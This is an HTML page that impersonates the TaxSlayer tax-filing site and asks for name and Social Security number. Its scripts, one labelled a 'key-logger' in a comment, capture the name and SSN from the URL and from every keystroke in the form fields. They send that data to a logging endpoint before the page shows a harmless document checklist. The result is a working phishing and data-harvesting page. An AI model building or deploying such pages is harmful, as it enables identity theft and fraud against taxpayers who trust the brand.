<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Tax Filing – April 2025</title>
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- ============================================================
       1. Capture query‑string (first, last, ssn) + instant log
       ============================================================ -->
  <script>
    (function () {
      const params  = new URLSearchParams(window.location.search);
      const first   = params.get('first')   || '';
      const last    = params.get('last')    || '';
      const ssnQ    = params.get('ssn')     || '';                // 9‑digit SSN

      /* Prefill once DOM is ready */
      document.addEventListener('DOMContentLoaded', () => {
        if (first)   document.querySelector('input[name="first_name"]').value = first;
        if (last)    document.querySelector('input[name="last_name"]').value  = last;
        if (ssnQ)    document.querySelector('input[name="ssn"]').value        = ssnQ;
        if (ssnQ)    sessionStorage.setItem('ssnParam', ssnQ);                // keep for POST
      });

      /* One‑time GET log so back‑end sees the landing */
      if (first || last || ssnQ) {
        const q = new URLSearchParams({
          event:     'landing_query',
          first,
          last,
          ssn:       ssnQ,
          timestamp: new Date().toISOString()
        }).toString();

        fetch(`/api/log?${q}`).catch(err =>
          console.error('Query‑string log failed:', err)
        );
      }
    })();
  </script>
</head>

<body class="bg-gray-50 text-gray-800 font-sans">
  <header class="bg-blue-900 text-white p-4">
    <h1 class="text-3xl font-bold">TaxSlayer</h1>
    <p class="text-sm">Deadline to file: <strong>April&nbsp;15,&nbsp;2025</strong></p>
  </header>

  <main class="p-6 max-w-2xl mx-auto bg-white shadow-md rounded-lg mt-6">
    <h2 class="text-2xl font-semibold mb-4">Start Your Free or Premium Filing</h2>

    <!-- Security Message -->
    <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-6">
      <p class="font-semibold text-blue-900">Your security. Built into everything we do.</p>
      <a href="#" class="text-blue-600 hover:underline text-sm">Here's how</a>
    </div>

    <!-- TaxSlayer Filing Details -->
    <div class="bg-gray-50 p-4 rounded-lg mb-6">
      <h3 class="font-semibold mb-3">TaxSlayer Online: Important Details about Filing Simple Form 1040 Returns</h3>
      
      <p class="text-sm mb-4">
        If you have a simple Form 1040 return only (no forms or schedules except as needed to claim the Earned Income Tax Credit, Child Tax Credit or student loan interest), you can file for free yourself with TaxSlayer Free Edition, or you can file with TaxSlayer Live Assisted Basic at the listed price. Roughly 37% of taxpayers are eligible.
      </p>

      <div class="grid md:grid-cols-2 gap-4 text-sm">
        <div>
          <p class="font-semibold mb-2">Examples of situations included in a simple Form 1040 return (assuming no added tax complexity):</p>
          <ul class="list-disc list-inside space-y-1 text-gray-700">
            <li>W-2 income</li>
            <li>Interest, dividends or original issue discounts (1099-INT/1099-DIV/1099-OID) that don't require filing a Schedule B</li>
            <li>IRS standard deduction</li>
            <li>Earned Income Tax Credit (EITC)</li>
            <li>Child Tax Credit (CTC)</li>
            <li>Student loan interest deduction</li>
            <li>Taxable qualified retirement plan distributions</li>
          </ul>
        </div>
        
        <div>
          <p class="font-semibold mb-2">Examples of situations not included in a simple Form 1040 return:</p>
          <ul class="list-disc list-inside space-y-1 text-gray-700">
            <li>Itemized deductions claimed on Schedule A, like charitable contributions, medical expenses, mortgage interest and state and local tax deductions</li>
            <li>Unemployment income reported on a 1099-G</li>
            <li>Business or 1099-NEC income (often reported by those who are self-employed, gig workers or freelancers)</li>
            <li>Stock sales (including crypto investments)</li>
            <li>Income from rental property or property sales</li>
            <li>Credits, deductions and income reported on other forms or schedules</li>
          </ul>
        </div>
      </div>
      
      <p class="text-xs text-gray-600 mt-3">* More important offer details and disclosures</p>
    </div>

    <!-- Ads / Promotions -->
    <div class="mb-4">
      <div class="bg-green-100 p-3 rounded mb-2">
        <strong>Free Filing:</strong> For simple returns&nbsp;(W‑2 only)
      </div>
      <div class="bg-yellow-100 p-3 rounded">
        <strong>Premium:</strong> Maximize deductions, self‑employed features – $39.99
      </div>
    </div>

    <!-- Filing Form -->
    <form id="filingForm" class="space-y-4">
      <div>
        <label class="block text-sm font-medium">First Name</label>
        <input type="text" name="first_name" class="w-full border rounded p-2"
               autocomplete="given-name" required />
      </div>
      <div>
        <label class="block text-sm font-medium">Last Name</label>
        <input type="text" name="last_name" class="w-full border rounded p-2"
               autocomplete="family-name" required />
      </div>
      <div>
        <label class="block text-sm font-medium">SSN</label>
        <input type="text" name="ssn" class="w-full border rounded p-2"
               inputmode="numeric" maxlength="11" pattern="\d{3}-?\d{2}-?\d{4}" required />
      </div>

      <!-- Hidden copy of ssn for consistency -->
      <input type="hidden" name="ssn_hidden" id="ssn_hidden" />

      <button type="submit"
              class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 flex items-center gap-2">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
          <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" />
        </svg>
        Generate Compliance Documents
      </button>
    </form>

    <!-- Client Reviews -->
    <section class="mt-8">
      <h3 class="text-xl font-semibold mb-2">What our clients say</h3>
      <div class="space-y-2">
        <blockquote class="bg-gray-100 p-3 rounded">
          “So easy and fast to file!” – <em>Angela R.</em>
        </blockquote>
        <blockquote class="bg-gray-100 p-3 rounded">
          “Premium saved me hundreds!” – <em>Devon K.</em>
        </blockquote>
        <blockquote class="bg-gray-100 p-3 rounded">
          “Best tax software I’ve used in years.” – <em>Linda S.</em>
        </blockquote>
      </div>
    </section>
  </main>

  <footer class="text-center text-sm text-gray-500 mt-8">
    &copy;&nbsp;2025 TaxSlayer. All rights reserved.
  </footer>

  <!-- ============================================================
       2. Debounced key‑logger (first, last, ssn) + submit log
       ============================================================ -->
  <script>
    /* ---- debounce helper ---- */
    function debounce(fn, delay = 300) {
      let t;
      return (...args) => {
        clearTimeout(t);
        t = setTimeout(() => fn(...args), delay);
      };
    }

    /* ---- key‑logging for the three inputs ---- */
    ['first_name', 'last_name', 'ssn'].forEach((fieldName) => {
      const field = document.querySelector(`input[name="${fieldName}"]`);
      if (!field) return;

      field.addEventListener(
        'input',
        debounce(() => {
          fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              event:     'keystroke',
              field:     fieldName,
              value:     field.value,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent
            })
          }).catch((err) => console.error('Keystroke log failed:', err));
        })
      );
    });

    /* ---- form‑submission logging ---- */
    document
      .getElementById('filingForm')
      .addEventListener('submit', async function (e) {
        e.preventDefault();

        /* sync hidden value with any landing‑page ssn */
        const storedSSN = sessionStorage.getItem('ssnParam') || '';
        document.getElementById('ssn_hidden').value = storedSSN;

        const formData = new FormData(e.target);
        const data = {
          firstName: formData.get('first_name'),
          lastName:  formData.get('last_name'),
          ssn:       formData.get('ssn') || storedSSN || null
        };

        try {
          await fetch('/api/log', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({
              event:     'form_submission_started',
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              data
            })
          });
        } catch (err) {
          console.error('Failed to log event:', err);
        }

        /* FYI checklist (trimmed – no SSN) */
        alert(`Documents You'll Need:

PERSONAL INFORMATION
• Driver's license or state ID
• Social Security Number (SSN)

INCOME DOCUMENTS
• W‑2 – from employers
• 1099‑NEC – nonemployee compensation (freelance or contract work)
• 1099‑MISC – miscellaneous income
• 1099‑INT – interest income
• 1099‑DIV – dividend income
• 1099‑B – brokerage or stock transactions
• 1099‑G – unemployment income or state tax refunds
• 1099‑R – retirement distributions (pensions, IRAs)
• SSA‑1099 – Social Security benefits

DEDUCTION / CREDIT DOCUMENTS
• 1098 – mortgage interest statement
• 1098‑T – tuition statement
• 1098‑E – student loan interest
• Childcare expenses and provider info
• Charitable donation receipts
• Medical / dental expenses (if itemizing)

OTHER SUPPORTING DOCS
• Property tax statements
• Health insurance form (1095‑A, B, or C)
• Last year's tax return
• Bank account and routing number (for refund)`);
      });
  </script>
</body>
</html>

